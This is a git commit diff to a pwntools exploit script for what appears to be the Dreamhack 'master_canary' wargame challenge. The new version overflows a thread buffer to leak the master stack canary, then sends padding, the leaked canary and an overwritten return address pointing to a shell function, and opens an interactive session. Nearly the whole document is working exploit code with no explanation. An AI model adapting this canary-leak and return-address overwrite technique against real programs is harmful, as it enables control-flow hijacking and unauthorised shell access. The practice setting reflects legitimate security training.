378d2e56303d189ea14d693007458c2874c58656
Your Name <you@example.com>
2020-11-16 09:07:29 -0800

    t

--- dreamhack/master_canary/ex.py
+++ dreamhack/master_canary/ex.py
@@ -3,29 +3,21 @@ from pwn import *
 context.update(log_level= 'debug')
 p = process('master_canary')
 
-p.recvrepeat(1)
-#Create a thread
-p.sendline('1')
+p.sendlineafter('> ', '1')
+p.sendlineafter('> ', '2')
 
+size = 0x8e8+1
 p.recvrepeat(1)
-#Write data
-p.sendline('2')
-
-p.recvrepeat(1)
-
-#Send size value
-size = 0x818988+8
 p.sendline(str(size))
 
+#raw_input('debug: ' + str(p.pid))
 p.recvrepeat(1)
-
-#Send data
-canary = 'DEADBEAF'
-payload = 'a'*0x108 + canary
-payload += '\x00'*(size - len(payload) - 8) + canary
-log.info('size: ' + hex(size))
-log.info('Payload length: ' + hex(len(payload)))
-raw_input('debug : ' + str(p.pid))
-p.sendline(payload)
-
+p.send('a'*size)
+p.recvuntil('Data: ')
+canary = u64(p.recv(size+7)[-7:].rjust(8, '\x00'))
+log.info('canary: ' + hex(canary))
+addr_shell = 0x400A4A
+p.sendlineafter('> ', '3')
+p.recvrepeat(1)
+p.sendline('a'*0x28 + p64(canary) + 'aaaaaaaa' + p64(addr_shell))
 p.interactive()
